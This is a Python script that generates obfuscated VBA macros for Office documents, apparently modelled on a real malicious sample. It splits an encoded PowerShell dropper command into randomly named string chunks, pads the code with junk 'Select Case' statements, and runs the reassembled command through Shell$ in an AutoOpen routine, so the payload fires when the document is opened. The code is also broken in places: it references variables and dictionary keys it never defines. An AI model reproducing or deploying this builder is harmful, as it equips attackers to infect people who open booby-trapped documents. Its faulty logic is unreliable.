import random
import os
import math
import string

used_variable_names = []

def generate_variable_name():
    first_character = random.choice(string.ascii_letters)
    number_of_additional_characters = random.randint(5, 6)
    additional_character_options = list(string.ascii_letters)
    for d in string.digits:
        additional_character_options.append(d)

    # there is a much higher appearance rate of _ than letters/digits, add 20 of them to increase frequency

    underscore_counter = 0
    while underscore_counter < 20:
        additional_character_options.append("_")
        underscore_counter = underscore_counter + 1

    var_length_counter = 0

    var_to_return = first_character

    while var_length_counter < number_of_additional_characters:
        var_to_return = str(var_to_return + random.choice(additional_character_options))
        var_length_counter = var_length_counter + 1

    return var_to_return

def get_new_variable_name():
    while True:
        candidate = generate_variable_name()
        if candidate not in used_variable_names:
            used_variable_names.append(candidate)
            return candidate

'''
   Select Case i28839_9
         Case 295330195
M4__9_7 = (n_09_113 * Fix(237213327 / CBool(l3386_20))) - I4_2_9_ / Oct(365202573) / 251948038 + CStr(S_3_66_) - 358443852 + ChrB(X7__1259)
End Select
   Select Case T048_6
         Case 123926770
l7230682 = (p__9_7 * Fix(552349161 / CBool(f4_____9))) - C_7__3 / Oct(650875901) / 745484596 + CStr(r_99_1) - 29972076 + ChrB(X45700)
End Select
   Select Case l_9665_4
         Case 268175503
i49_80 = (J8_418_ * Fix(928174828 / CBool(t85_594))) - G0405214 / Oct(441985149) / 161706374 + CStr(B67_4___) - 200113004 + ChrB(L5_4___1)
End Select
'''

def generate_nonsense_case_statement():
    case_vba = "\tSelect Case {}\r\n".format(get_new_variable_name()) + \
                "\t\tCase {}\r\n".format(str(random.randint(3000000, 999999999))) + \
                "{} = ({} * Fix({} / CBool({}))) - {} / Oct({}) / {} + CStr({}) - {} + ChrB({})\r\n".format(
                    get_new_variable_name(),  # initial var
                    get_new_variable_name(),  # after first {
                    str(random.randint(3000000, 999999999)),  # Fix(this
                    get_new_variable_name(),  # CBool(this
                    get_new_variable_name(),  # CBool() - this /
                    str(random.randint(3000000, 999999999)),  # Oct(this)
                    str(random.randint(3000000, 999999999)),  # Oct() / this +
                    get_new_variable_name(),  # CStr(this)
                    str(random.randint(3000000, 999999999)),  # CStr() - this +
                    get_new_variable_name()  # ChrB(this)
                ) + \
                "End Select\r\n"
    return case_vba


def generate(dropperbase64):
    playbook = list()
    utility_variables_list = ['win32_process_startup',
                              'win32_process',
                              'main_func',  # Function 10_1__ in sample 77ac
                              'main_func_arg',  # o7_572_ in sample 77ac
                              'create',
                              'dummy_function_1',
                              'dummy_function_2',
                              'dummy_function_3',
                              'dummy_function_4'
                              ]

    payloadvariables = []
    utilityvariables = {}

    process_creation_args = "powersheLl -e "
    remaining_payload = process_creation_args + dropperbase64
    chunked_payload = []

    while len(remaining_payload) > 0:
        thischunksize = random.randint(3, 7)
        if thischunksize > len(remaining_payload):
            thischunksize = len(remaining_payload)
        thischunk = remaining_payload[0:thischunksize]
        remaining_payload = remaining_payload[thischunksize:]
        chunked_payload.append(thischunk)

    while len(payloadvariables) < len(chunked_payload):
        payloadvariables.append(get_new_variable_name())

    for utilityvar in utility_variables_list:
        utilityvariables[utilityvar] = get_new_variable_name()

    vba = ''



    if len(chunked_payload) == len(payloadvariables):
        counter = 0
        interspersed_count = 0
        interspersed_deobf = str(utilityvariables['final_deobf_destination'] + ' = ' + utilityvariables[
            'final_deobf_destination'] + ' & ')
        while counter < len(chunked_payload):
            vba += "\t" + str("Dim " + payloadvariables[counter] + " As String" + "\r\n")
            vba += "\t" + (payloadvariables[counter] + ' = ' + '"' + chunked_payload[counter] + '"' + "\r\n")
            interspersed_count = interspersed_count + 1
            interspersed_deobf = interspersed_deobf + payloadvariables[counter] + ' & '
            if interspersed_count > 4 or (len(chunked_payload) - counter) < 4:
                interspersed_deobf = str(interspersed_deobf.rstrip('& ') + "\r\n")
                vba += "\t" + interspersed_deobf
                interspersed_count = 0
                interspersed_deobf = str(utilityvariables['final_deobf_destination'] + ' = ' + utilityvariables[
                    'final_deobf_destination'] + ' & ')
            counter = counter + 1
            if vbpsreassemblycounter < frequencytoreassemblevbps and vbpsreassemblylist:
                vbpsreassemblycounter += 1
            elif vbpsreassemblycounter == frequencytoreassemblevbps and vbpsreassemblylist:
                thispop = vbpsreassemblylist.pop(0)
                vba += thispop
                thispop = vbpsreassemblylist.pop(0)
                vba += thispop
                vbpsreassemblycounter = 0
    deobf = ''
    vba += "\t" + str(utilityvariables['powershell_var']) + ' = ' + str(
        utilityvariables['powershell_var']) + " + " + str(utilityvariables['final_deobf_destination']) + "\r\n"
    vba += "\t" + 'Shell$ ' + str(utilityvariables['powershell_var']) + "\r\n"
    # wrap the vba


    vba = "Sub AutoOpen()\r\n" + vba + "End Sub"

    playbook.append({'add_vba_module': vba})

    used_variable_names = []

    return playbook

if __name__ == '__main__':
    #print(generate_variable_name())
    print(generate_nonsense_case_statement())
